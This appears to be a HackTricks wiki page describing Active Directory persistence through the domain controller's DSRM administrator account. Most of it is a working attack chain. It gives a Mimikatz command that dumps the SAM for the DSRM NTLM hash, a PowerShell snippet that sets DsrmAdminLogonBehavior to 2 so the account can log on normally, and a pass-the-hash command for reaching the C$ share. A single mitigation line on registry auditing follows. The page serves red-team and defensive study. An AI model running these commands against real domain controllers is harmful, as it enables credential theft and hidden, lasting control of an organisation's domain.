# DSRM Credentials

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

Every domain controller has a Directory Services Restore Mode (DSRM) administrator account. Its password is set during domain-controller promotion and is separate from Active Directory domain accounts.<sup>[[1]](#references)</sup>

An attacker with administrative control of a domain controller can dump the local SAM database and recover the DSRM Administrator NTLM hash. The following Mimikatz command performs that operation:<sup>[[2]](#references)</sup>

```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```

By default, the DSRM account is intended for restore mode. Setting `DsrmAdminLogonBehavior` to `2` permits this local account to authenticate while the domain controller is running normally. Check the value before changing it:<sup>[[2]](#references)[[3]](#references)</sup>

```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$current = Get-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -ErrorAction SilentlyContinue

if ($null -eq $current) {
    New-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
} else {
    Set-ItemProperty -Path $lsaPath -Name DsrmAdminLogonBehavior -Value 2
}
```

The recovered hash can then be used in a pass-the-hash session to access resources such as the administrative `C$` share. For this local account, use the domain controller's computer name as the `/domain` value:<sup>[[3]](#references)</sup>

```powershell
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
# In the new PowerShell process, access C$ over NTLM.
ls \\dc-host-name\C$
```

## Mitigation

- Audit changes to `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`. Security event 4657 records a registry value modification when the key's SACL is configured to audit **Set Value** operations.<sup>[[4]](#references)</sup>

## References

- [1] [Microsoft: Reset the Directory Services Restore Mode administrator password](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/reset-directory-services-restore-mode-admin-pwd)
- [2] [ADSecurity: Sneaky Active Directory Persistence #11 — Directory Service Restore Mode](https://adsecurity.org/?p=1714)
- [3] [ADSecurity: Sneaky Active Directory Persistence #13 — DSRM Persistence v2](https://adsecurity.org/?p=1785)
- [4] [Microsoft: Event 4657 — A registry value was modified](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)

{{#include ../../banners/hacktricks-training.md}}
